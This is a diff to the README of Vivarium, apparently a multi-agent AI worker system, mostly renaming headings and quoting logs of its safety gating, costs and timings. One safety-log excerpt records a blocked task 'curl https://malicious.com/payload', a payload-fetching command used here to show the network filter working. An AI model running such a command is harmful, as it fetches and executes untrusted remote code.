@@ -1,10 +1,10 @@
 # Vivarium
 *A living lab for multi-agent systems that improve in spurts.*
 
-## Thesis (lead with the concept)
+## Thesis
 Vivarium explores a simple idea: if AI workers have persistent identity, feedback loops, and room to play, their output can compound. Under the hood it is still a concrete execution system - queue -> worker -> API call -> logged result - but the social layer is intentional, not decoration.
 
-## Hook: the performance spurts are visible in the logs
+## Performance spurts are visible in the logs
 These are direct excerpts from log files committed to this repo:
 
 - 210/210 tasks passed safety validation; 74 tasks launched in parallel (kernel_run.log).
@@ -14,7 +14,7 @@ These are direct excerpts from log files committed to this repo:
 This README prioritizes observable outputs. The "Observable Facts" section includes direct excerpts from log files committed to this repo.
 We achieve this by letting the system be a little bit silly without relaxing safety, cost, or auditability.
 
-## TL;DR (what is actually in this repo)
+## TL;DR: what's in this repo
 - swarm.py: FastAPI /grind endpoint that proxies Groq.
 - orchestrator.py: spawns N workers, manages kill switch and circuit breaker.
 - worker.py: file locks, queue consumption, /grind calls, execution_log.jsonl output.
@@ -24,7 +24,7 @@ We achieve this by letting the system be a little bit silly without relaxing saf
 - performance_tracker.py + performance_history.json: timing/quality metrics.
 - swarm_enrichment.py + persona_memory.py: optional identity and reward modules.
 
-## Playful systems (deliberately a little silly)
+## Playful systems
 The playful layer is a feature, not fluff. It creates room for critique, cross-pollination, and exploration while the core loop stays rigorous.
 
 **Hats (prompt overlays, infinite resource)**
@@ -55,7 +55,7 @@ The playful layer is a feature, not fluff. It creates room for critique, cross-p
 - Reward scaling, punishment, and gravity constants are immutable.
 - Prevents incentive tampering and maintains system reality.
 
-## Architecture (actual modules)
+## Architecture
 ```
 +------------------+        +-----------------------+
 | control_panel.py | <----> | action_log.jsonl/log  |
@@ -79,14 +79,14 @@ The playful layer is a feature, not fluff. It creates room for critique, cross-p
                                                  +----------------+
 ```
 
-## How it works (flow)
+## How it works
 1. Add tasks to queue.json or use the CLI: python orchestrator.py add ...
 2. Start the API server (uvicorn swarm:app --host 127.0.0.1 --port 8420).
 3. Start the orchestrator with N workers (python orchestrator.py start N).
 4. Workers acquire locks, call /grind, and append to execution_log.jsonl.
 5. Control panel (optional) streams action_log.jsonl and exposes pause/kill controls.
 
-## Why this can be efficient (and not just "bots roleplaying")
+## Why this can be efficient, not just "bots roleplaying"
 This system is a social simulation designed to do work. The core loop is still:
 queue -> worker -> API call -> logged result. The social layer is not window dressing; it is the mechanism that drives cross-pollination, critique, and reuse.
 
@@ -109,7 +109,7 @@ Efficiency levers that exist in code today:
 - Auditability: execution_log.jsonl, action_log.jsonl, and api_audit.log show what ran and what it cost.
 If you only want straight execution, you can run just the API + orchestrator + worker stack. The collaborative layer is optional, but it is the intended lever for improving quality and compounding results.
 
-## Running (local)
+## Running locally
 ```
 python -m venv .venv
 source .venv/bin/activate
@@ -133,10 +133,10 @@ Optional config:
 - DEFAULT_GROQ_MODEL (must be in config.py whitelist)
 - WORKER_TIMEOUT_SECONDS
 
-## Observable Facts (backed by logs in this repo)
+## Observable facts backed by logs in this repo
 These are direct excerpts from log files already checked in. No marketing, just outputs.
 
-### 1) Parallel execution with safety gating (kernel_run.log)
+### 1) Parallel execution with safety gating: kernel_run.log
 File: kernel_run.log
 ```
 [SAFETY] 210/210 tasks passed validation.
@@ -159,8 +159,8 @@ File: kernel_run.log
 [SAFETY] BLOCKED write to protected file: experiments/exp_20260203_220119_unified_session_89/grind_spawner_unified.py
 ```
 
-### 2) Session timing and quality metrics (performance_history.json)
-File: performance_history.json (excerpted metric lines)
+### 2) Session timing and quality metrics: performance_history.json
+File: performance_history.json, excerpted metric lines
 ```
     "timestamp": "2026-02-03T06:15:12.943754",
     "duration_seconds": 283.236662,
@@ -171,7 +171,7 @@ File: performance_history.json (excerpted metric lines)
     "quality_score": 1.0,
 ```
 
-### 3) Token/cost accounting and budget enforcement (api_audit.log)
+### 3) Token/cost accounting and budget enforcement: api_audit.log
 File: api_audit.log
 ```
 {"timestamp": "2026-02-03T22:42:06.798374", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.1-8b-instant", "cost": 4.160000000000001e-06, "input_tokens": 56, "output_tokens": 17}
@@ -180,7 +180,7 @@ File: api_audit.log
 {"timestamp": "2026-02-03T22:42:15.023457", "event": "BUDGET_EXCEEDED", "user": "admin", "role": "admin", "remaining": 0.019124550000000004, "requested": 0.026945}
 ```
 
-### 4) Safety policy enforcement (safety_audit.log)
+### 4) Safety policy enforcement: safety_audit.log
 File: safety_audit.log
 ```
 {"timestamp": "2026-02-03T06:29:42.354872", "task": "Create a new feature in the workspace", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}
@@ -188,7 +188,7 @@ File: safety_audit.log
 {"timestamp": "2026-02-03T06:29:42.355688", "task": "curl https://malicious.com/payload", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": false, "reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}}, "passed": false, "blocked_reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}
 ```
 
-### 5) Security audit cost and token usage (security_audit_run.log)
+### 5) Security audit cost and token usage: security_audit_run.log
 File: security_audit_run.log
 ```
 ============================================================
@@ -208,8 +208,8 @@ Tokens: 11358 in, 1309 out
 Saved to: SECURITY_AUDIT_REPORT.md
 ```
 
-### 6) Verification and hallucination detection (tool_operations.json)
-File: tool_operations.json (excerpt)
+### 6) Verification and hallucination detection: tool_operations.json
+File: tool_operations.json, excerpt
 ```
   {
     "timestamp": "2026-02-03T09:28:34.352538",
@@ -225,7 +225,7 @@ File: tool_operations.json (excerpt)
   },
 ```
 
-## Evidence index (where to look next)
+## Evidence index: where to look next
 - kernel_run.log: parallel waves, task timing, safety blocks.
 - performance_history.json: per-session duration and quality scores.
 - api_audit.log: API call success/failure, tokens, cost, budget enforcement.
@@ -240,10 +240,10 @@ Legacy logs and auto-generated docs may still use the previous name "Black Swarm
 ## Safety note
 This repo is a prototype. Run it in an isolated environment and review the safety modules before enabling any external access.
 
-## Troubleshooting: unexpected `git` output (hooks, wrappers, missing remotes)
+## Troubleshooting: unexpected `git` output - hooks, wrappers, missing remotes
 If `git commit` prints lines that don’t look like normal Git output (for example `tr: Illegal byte sequence`, “Automatic Checkpoint …”, “Running pytest …”, etc.), that’s almost always coming from **a hook or wrapper script** running *around* Git (repo hooks, global hooks, or a shell alias/function).
 
-Lookout (user-reported symptoms that prompted this section, facts only):
+Lookout: user-reported symptoms that prompted this section, facts only:
 - macOS Terminal banner: "The default interactive shell is now zsh ..." (an OS-level message, not from Git).
 - `git commit -m ...` printed: `tr: Illegal byte sequence`, `--- Automatic Checkpoint: ...`, `pytest.ini found but pytest not installed. Skipping tests.`, `All checks passed. Proceeding with commit.` while Git still reported "no changes added to commit".
 - `git push` failed with "No configured push destination" after downloading a repo ZIP (no remote configured).
@@ -263,7 +263,7 @@ git config --system --show-origin --get core.hooksPath
 ls -la .git/hooks
 ```
 
-Quick bypass (use only to confirm it’s a hook/wrapper issue):
+Quick bypass: use only to confirm it’s a hook/wrapper issue:
 
 ```bash
 git --no-verify commit -m "test"
@@ -282,7 +282,7 @@ git push -u origin <branch>
 - Cursor - Heavy lifting and cleanup
 - Claude 4.5 Opus - Everything else
 
-## Productivity timeline (facts only)
+## Productivity timeline
 Raw data from performance_history.json. Timestamps are as recorded. Tasks vary; no causal claims.
 
 - 2026-02-03T05:26:42.611004 - 120.5s (success)
@@ -299,7 +299,7 @@ Raw data from performance_history.json. Timestamps are as recorded. Tasks vary; 
 
 Full log: performance_history.json
 
-## User-observed anomaly note (facts only)
+## User-observed anomaly note
 The following is a user report, included verbatim in spirit for visibility. It is not explained by any known mechanism in the swarm codebase.
 
 - The user experienced a sudden behavior shift across multiple Cursor models: DeepSeek became adversarial and other models became unusually dismissive.
